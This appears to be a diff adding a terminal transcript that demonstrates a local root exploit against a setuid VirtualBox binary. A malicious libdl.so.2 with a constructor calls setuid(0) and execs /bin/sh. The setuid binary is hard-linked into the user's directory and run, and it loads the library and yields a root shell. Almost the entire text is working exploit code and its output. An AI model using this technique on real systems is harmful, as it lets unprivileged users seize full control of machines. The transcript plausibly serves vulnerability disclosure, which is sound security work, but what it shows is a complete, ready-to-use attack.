@@ -1,0 +1,31 @@
+$ id -u
+1002
+
+$ cat test.c
+#include <unistd.h>
+#include <sys/syscall.h>
+__attribute__((constructor))
+void awesome(void)
+{
+        char *argv[] = { "sh", NULL };
+        extern char *environ;
+        syscall(SYS_setuid, 0);
+        syscall(SYS_execve, "/bin/sh", argv, environ);
+}
+
+$ gcc -Wall test.c -fPIC -shared -o libdl.so.2 -Wl,-soname,libdl.so.2
+
+$ ls -l /opt/VirtualBox/VirtualBox
+-r-s--x--x 2 root vboxusers 23808 2009-01-30 01:57 /opt/VirtualBox/VirtualBox
+
+$ ln /opt/VirtualBox/VirtualBox
+
+$ ls -l VirtualBox
+-r-s--x--x 2 root vboxusers 23808 2009-01-30 01:57 VirtualBox
+
+$ ./VirtualBox
+./VirtualBox: /home/vapier/libdl.so.2: no version information available
+(required by ./VirtualBox)
+sh-4.0# whoami
+root
+
